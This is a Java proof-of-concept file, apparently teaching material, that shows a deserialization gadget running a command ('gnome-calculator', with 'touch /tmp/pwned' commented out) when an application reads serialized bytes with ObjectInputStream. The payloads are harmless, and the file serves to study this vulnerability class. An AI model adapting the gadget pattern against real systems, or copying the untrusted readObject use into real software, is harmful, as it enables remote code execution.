package sample1;

import sample2.Gadget2;
import sample2.Handler2;

import java.io.*;
import java.lang.reflect.Proxy;
import java.util.Map;

/**
 * Created by skirge on 16.02.17.
 */
public class Sample1 {

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // prepare serialized object
        Gadget1 g1 = getGadget();
        byte[] bytes = serialize(g1);
        // application reads serialized data
        Gadget1 g2 = readGadget(bytes);
        System.out.println("[*] Gadget deserialized = " + g2);
    }

    private static Gadget1 getGadget() {
        Gadget1 g = new Gadget1();
        //g.cmd = "touch /tmp/pwned";
        g.cmd = "gnome-calculator";
        return g;
    }

    private static byte[] serialize(Gadget1 g) throws IOException {
        File f = new File("/tmp/deser1.bin");
        FileOutputStream fout = new FileOutputStream(f);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(g);
        byte[] bytes = baos.toByteArray();
        fout.write(bytes);
        return bytes;
    }

    private static Gadget1 readGadget(byte[] bytes) throws IOException,
            ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
        Gadget1 g2 = (Gadget1) ois.readObject();
        return g2;
    }
}
